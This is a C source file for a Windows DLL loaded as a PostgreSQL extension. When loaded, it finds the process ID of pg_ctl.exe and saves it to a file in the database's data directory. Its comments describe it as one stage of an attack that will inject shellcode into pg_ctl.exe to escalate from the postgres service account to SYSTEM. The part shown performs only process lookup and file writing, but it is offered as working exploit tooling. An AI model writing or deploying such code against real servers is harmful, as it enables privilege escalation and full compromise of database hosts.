// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars32.bat"
// cl.exe /D_USRDLL /D_WINDLL /MT /Tc pgext1.cpp /link /DLL /out:pgext1.dll /SUBSYSTEM:CONSOLE /MACHINE:x86

#include "dll.h"
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")

	
HANDLE log_file = NULL;
DWORD bytesWritten = 0;
BOOL verbose_output = TRUE;

void log_msg(const char * line)
{
	if(verbose_output) WriteFile(log_file,line,strlen(line),&bytesWritten, NULL);
}

DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    do {
        if (strcmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if(ul_reason_for_call != DLL_PROCESS_ATTACH) return 0; // only execute this once, during process attach (we don't want this to run twice)
	if(verbose_output)
	{
		log_file = CreateFileA("C:\\Program Files (x86)\\PostgreSQL\\9.2\\data\\ext.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // create the log
		if (log_file != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(log_file, 0, NULL, FILE_END);
		}
	}
	// first, obtain the PID of the pg_ctl.exe process, because that's where we have to inject our shellcode, as we are currently in one of the postgres.exe processes, which all have weak primary tokens that do not hold SeImpersonate privilege and thus won't allow us to escalate to SYSTEM
    DWORD pid = GetProcessIdByName("pg_ctl.exe");
    if (!pid) {		
        log_msg("Process not found.\n");
		if(verbose_output) CloseHandle(log_file);
        return 1;
    }
	else
	{
		char msg[100];
		snprintf(msg,sizeof(msg),"PID found: %d\n",pid);
		log_msg(msg);		
		if(verbose_output) CloseHandle(log_file);	
		HANDLE pid_file = CreateFileA("C:\\Program Files (x86)\\PostgreSQL\\9.2\\data\\ext.pid", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		
		WriteFile(pid_file,&pid,sizeof(pid),&bytesWritten, NULL); // save the PID value into the file
		CloseHandle(pid_file);
	}
    return 0;
}